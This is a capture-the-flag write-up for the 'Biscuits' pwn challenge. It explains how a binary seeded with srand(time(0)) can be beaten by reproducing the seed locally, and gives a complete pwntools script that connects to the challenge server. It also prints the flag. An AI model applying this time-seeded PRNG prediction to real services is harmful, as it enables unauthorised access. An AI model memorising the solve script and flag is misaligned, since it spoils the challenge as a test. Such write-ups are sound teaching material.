https://ctftime.org/event/2607

# Biscuits (pwn)

Momma, can I have cookie..?

No....

nc 20.244.40.210 6000

## Analysis

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

`main` @ `0x2349`:
  - Calls `srand(time(0))`
  - Loops 100 times:
    - Uses `rand() % 100` to index an array of `char**`
    - Checks that the user supplied bytes `strcmp` equal the string pointed at the by the pointer at the index
      - If they don't match then call `exit`
  - Prints the flag

## Solution

1) Get a copy of the string table that the remote uses
2) Seed `srand` using the same time as on the remote
    - Note that `time(0)` returns the current time in seconds so it is quite possible to get the same value as the remote
3) In a loop - generate the same string table index that the remote generates and then provide the string found at the index
    - Note that we can provide more bytes, as shown in the poc, as long as we provide the `\x00` byte along with the extra bytes the `strcmp` will work - this just saves us having to worry about the length of the strings

```python
#!/usr/bin/env python3

from pwn import *
import ctypes
import struct

#context.log_level = "debug"
elf = ELF("./main", checksec=False)
context.binary = elf

cookies = elf.read(elf.sym["cookies"], 0x500)

# sha256: e7a914a33fd4f6d25057b8d48c7c5f3d55ab870ec4ee27693d6c5f3a532e6226 
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("20.244.40.210", 6000)

now = libc.time(0)
libc.srand(now)

for i in range(100):
    idx = libc.rand() % 100
    cookie = struct.unpack("<Q", cookies[idx * 8: (idx * 8) + 8])[0]
    p.sendlineafter(b"Guess the cookie: ", elf.read(cookie, 64))

p.readuntil(b"Flag: ")

# BITSCTF{7h4nk5_f0r_4ll_0f_th3_c00ki3s_1_r34lly_enjoy3d_th3m_d31fa51e}
print(p.readuntil(b"}").decode())
```

## Flag
`BITSCTF{7h4nk5_f0r_4ll_0f_th3_c00ki3s_1_r34lly_enjoy3d_th3m_d31fa51e}`

smiley 2025/02/07
